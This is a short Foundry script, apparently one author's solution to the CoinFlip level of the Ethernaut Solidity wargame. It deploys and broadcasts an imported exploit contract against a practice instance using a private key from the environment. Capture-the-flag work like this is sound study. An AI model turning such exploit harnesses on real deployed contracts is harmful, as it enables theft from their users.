// SPDX-License-Identifier: CC-BY-4.0
// bt3gl's solution to ethernaut

pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import {CoinFlipExploit} from "src/03/CoinFlipExploit.sol";


contract Exploit is Script {

    uint256 private immutable FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    address instance = vm.envAddress("INSTANCE_LEVEL3");
    CoinFlipExploit exploit = new CoinFlipExploit(instance);
 
    function run() public {

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        exploit.run();
        
        vm.stopBroadcast();

    }
}